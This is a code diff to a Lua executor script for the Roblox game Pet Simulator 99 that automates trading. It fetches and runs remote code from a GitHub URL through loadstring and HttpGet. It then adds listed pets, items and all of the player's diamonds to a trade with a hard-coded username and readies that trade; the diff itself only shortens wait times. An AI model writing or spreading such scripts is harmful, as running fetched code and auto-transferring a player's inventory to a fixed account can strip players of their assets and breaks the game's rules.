@@ -1,10 +1,10 @@
 --AUTO TRADE
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-99/main/waitForGameLoad.lua"))()
-wait(25)
+wait(15)
 if game.PlaceId == 8737899170 then
     Username = "REyifpof"
     getgenv().PetToTrade = {"Prison Axolotl", "Prison Cow"}
-    getgenv().PaternToTrade = {0,1,2}
+    getgenv().PaternToTrade = {0,1}
     getgenv().ItemToTrade = {"Mini Pinata", "Mini Lucky Block", "Party Box", "Rainbow Mini Chest", "Mini Chest", "Charm Stone", "Large Gift Bag", "Gift Bag", "Secret Key Upper Half", "Secret Key Lower Half", "Crystal Key Upper Half", "Crystal Key Lower Half", "Tech Key Lower Half", "Tech Key Upper Half", "Daycare Slot Voucher", "Spinny Wheel Ticket", "Tech Spinny Wheel Ticket", "Diamond", "Insta Plant Capsule", "Seed Bag", "Arcade Token"}
 
     local library = require(game.ReplicatedStorage.Library)
@@ -27,7 +27,7 @@ if game.PlaceId == 8737899170 then
     end
 
     local function ReadyTrade()
-        wait(3.8)
+        wait(3.5)
         local args = {
             [1] = GetTradeID(),
             [2] = true,
@@ -62,7 +62,7 @@ if game.PlaceId == 8737899170 then
                     if v.pt == Patern then
                         for _, PetName in pairs(getgenv().PetToTrade) do
                             if v.id == PetName then
-                                wait(0.2)
+                                wait(0.1)
                                 local args = {
                                     [1] = GetTradeID(),
                                     [2] = "Pet",
@@ -79,7 +79,7 @@ if game.PlaceId == 8737899170 then
                         if Patern == 0 then
                             for _, PetName in pairs(getgenv().PetToTrade) do
                                 if v.id == PetName then
-                                    wait(0.2)
+                                    wait(0.1)
                                     local args = {
                                         [1] = GetTradeID(),
                                         [2] = "Pet",
@@ -103,7 +103,7 @@ if game.PlaceId == 8737899170 then
                 id = v.id
                 dir = library.Directory.Pets[id]
                 if dir.huge then
-                    wait(0.2)
+                    wait(0.1)
                     local args = {
                         [1] = GetTradeID(),
                         [2] = "Pet",
@@ -122,7 +122,7 @@ if game.PlaceId == 8737899170 then
             if v._am ~= nil then
                 for _, itemName in pairs(getgenv().ItemToTrade) do
                     if v.id == itemName then
-                        wait(0.2)
+                        wait(0.1)
                         local args = {
                             [1] = GetTradeID(),
                             [2] = "Misc",
@@ -142,7 +142,7 @@ if game.PlaceId == 8737899170 then
             if v._am ~= nil then
                 for _, itemName in pairs(getgenv().ItemToTrade) do
                     if v.id == itemName then
-                        wait(0.2)
+                        wait(0.1)
                         local args = {
                             [1] = GetTradeID(),
                             [2] = "Seed",
@@ -160,7 +160,7 @@ if game.PlaceId == 8737899170 then
     local function DepositDiamondsInTrade()
         for i,v in pairs(save.Inventory.Currency) do
             if v.id == 'Diamonds' then
-                wait(0.2)
+                wait(0.1)
                 local args = {
                     [1] = GetTradeID(),
                     [2] = "Currency",
